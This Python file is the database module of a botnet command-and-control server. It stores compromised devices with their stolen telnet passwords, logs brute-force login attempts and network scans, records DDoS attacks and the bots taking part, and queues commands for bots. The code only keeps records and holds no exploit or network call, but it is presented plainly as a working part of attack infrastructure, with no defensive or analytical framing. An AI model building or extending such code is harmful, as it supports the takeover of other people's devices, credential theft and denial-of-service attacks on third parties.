#!/usr/bin/env python3
"""
Database module for C2 Server
Handles storage of compromised devices, credentials, and attack logs
"""

import sqlite3
import datetime
import json
from typing import List, Dict, Optional, Tuple
import threading

class C2Database:
    def __init__(self, db_path: str = "c2_server.db"):
        """Initialize database connection and create tables"""
        self.db_path = db_path
        self.lock = threading.Lock()
        self.init_database()
    
    def init_database(self):
        """Create database tables if they don't exist"""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Compromised devices table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS compromised_devices (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT UNIQUE NOT NULL,
                    port INTEGER DEFAULT 23,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    device_type TEXT,
                    status TEXT DEFAULT 'active',
                    first_compromised TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Telnet credentials table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS telnet_credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT NOT NULL,
                    port INTEGER DEFAULT 23,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    success BOOLEAN NOT NULL,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Network scan results table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS scan_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT NOT NULL,
                    port INTEGER NOT NULL,
                    service TEXT,
                    status TEXT NOT NULL,
                    scan_timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # DDoS attack logs table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS ddos_attacks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_ip TEXT NOT NULL,
                    target_port INTEGER,
                    attack_type TEXT NOT NULL,
                    participating_bots TEXT,
                    start_time TIMESTAMP,
                    end_time TIMESTAMP,
                    status TEXT DEFAULT 'planned'
                )
            ''')
            
            # Bot commands table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS bot_commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    bot_ip TEXT NOT NULL,
                    command TEXT NOT NULL,
                    parameters TEXT,
                    status TEXT DEFAULT 'pending',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    executed_at TIMESTAMP
                )
            ''')
            
            conn.commit()
            conn.close()
    
    def add_compromised_device(self, ip: str, port: int, username: str, 
                             password: str, device_type: str = "unknown") -> bool:
        """Add a new compromised device to database"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT OR REPLACE INTO compromised_devices 
                    (ip_address, port, username, password, device_type)
                    VALUES (?, ?, ?, ?, ?)
                ''', (ip, port, username, password, device_type))
                
                conn.commit()
                conn.close()
                return True
            except Exception as e:
                print(f"Error adding compromised device: {e}")
                return False
    
    def get_compromised_devices(self) -> List[Dict]:
        """Get all compromised devices"""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT ip_address, port, username, password, device_type, 
                       status, first_compromised, last_seen
                FROM compromised_devices
                WHERE status = 'active'
            ''')
            
            devices = []
            for row in cursor.fetchall():
                devices.append({
                    'ip': row[0],
                    'port': row[1],
                    'username': row[2],
                    'password': row[3],
                    'device_type': row[4],
                    'status': row[5],
                    'first_compromised': row[6],
                    'last_seen': row[7]
                })
            
            conn.close()
            return devices
    
    def add_credential_attempt(self, ip: str, port: int, username: str, 
                             password: str, success: bool) -> bool:
        """Log credential brute force attempt"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT INTO telnet_credentials 
                    (ip_address, port, username, password, success)
                    VALUES (?, ?, ?, ?, ?)
                ''', (ip, port, username, password, success))
                
                conn.commit()
                conn.close()
                return True
            except Exception as e:
                print(f"Error logging credential attempt: {e}")
                return False
    
    def get_successful_credentials(self) -> List[Dict]:
        """Get all successful credential attempts"""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT ip_address, port, username, password, timestamp
                FROM telnet_credentials
                WHERE success = 1
                ORDER BY timestamp DESC
            ''')
            
            credentials = []
            for row in cursor.fetchall():
                credentials.append({
                    'ip': row[0],
                    'port': row[1],
                    'username': row[2],
                    'password': row[3],
                    'timestamp': row[4]
                })
            
            conn.close()
            return credentials
    
    def add_scan_result(self, ip: str, port: int, service: str, status: str) -> bool:
        """Add network scan result"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT INTO scan_results (ip_address, port, service, status)
                    VALUES (?, ?, ?, ?)
                ''', (ip, port, service, status))
                
                conn.commit()
                conn.close()
                return True
            except Exception as e:
                print(f"Error adding scan result: {e}")
                return False
    
    def get_scan_results(self, limit: int = 100) -> List[Dict]:
        """Get recent scan results"""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT ip_address, port, service, status, scan_timestamp
                FROM scan_results
                ORDER BY scan_timestamp DESC
                LIMIT ?
            ''', (limit,))
            
            results = []
            for row in cursor.fetchall():
                results.append({
                    'ip': row[0],
                    'port': row[1],
                    'service': row[2],
                    'status': row[3],
                    'timestamp': row[4]
                })
            
            conn.close()
            return results
    
    def start_ddos_attack(self, target_ip: str, target_port: int, 
                         attack_type: str, bot_ips: List[str]) -> int:
        """Log start of DDoS attack"""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO ddos_attacks 
                (target_ip, target_port, attack_type, participating_bots, start_time, status)
                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, 'active')
            ''', (target_ip, target_port, attack_type, json.dumps(bot_ips)))
            
            attack_id = cursor.lastrowid
            conn.commit()
            conn.close()
            return attack_id
    
    def stop_ddos_attack(self, attack_id: int) -> bool:
        """Log end of DDoS attack"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
                cursor.execute('''
                    UPDATE ddos_attacks 
                    SET end_time = CURRENT_TIMESTAMP, status = 'completed'
                    WHERE id = ?
                ''', (attack_id,))
                
                conn.commit()
                conn.close()
                return True
            except Exception as e:
                print(f"Error stopping DDoS attack: {e}")
                return False
    
    def get_active_attacks(self) -> List[Dict]:
        """Get all active DDoS attacks"""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, target_ip, target_port, attack_type, 
                       participating_bots, start_time
                FROM ddos_attacks
                WHERE status = 'active'
            ''')
            
            attacks = []
            for row in cursor.fetchall():
                attacks.append({
                    'id': row[0],
                    'target_ip': row[1],
                    'target_port': row[2],
                    'attack_type': row[3],
                    'participating_bots': json.loads(row[4]),
                    'start_time': row[5]
                })
            
            conn.close()
            return attacks
    
    def update_bot_status(self, bot_ip: str, status: str) -> bool:
        """Update bot last seen timestamp"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
                cursor.execute('''
                    UPDATE compromised_devices 
                    SET last_seen = CURRENT_TIMESTAMP, status = ?
                    WHERE ip_address = ?
                ''', (status, bot_ip))
                
                conn.commit()
                conn.close()
                return True
            except Exception as e:
                print(f"Error updating bot status: {e}")
                return False
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            stats = {}
            
            # Count compromised devices
            cursor.execute('SELECT COUNT(*) FROM compromised_devices WHERE status = "active"')
            stats['active_bots'] = cursor.fetchone()[0]
            
            # Count successful credentials
            cursor.execute('SELECT COUNT(*) FROM telnet_credentials WHERE success = 1')
            stats['successful_credentials'] = cursor.fetchone()[0]
            
            # Count active attacks
            cursor.execute('SELECT COUNT(*) FROM ddos_attacks WHERE status = "active"')
            stats['active_attacks'] = cursor.fetchone()[0]
            
            # Recent scan results
            cursor.execute('SELECT COUNT(*) FROM scan_results WHERE scan_timestamp > datetime("now", "-1 hour")')
            stats['recent_scans'] = cursor.fetchone()[0]
            
            conn.close()
            return stats
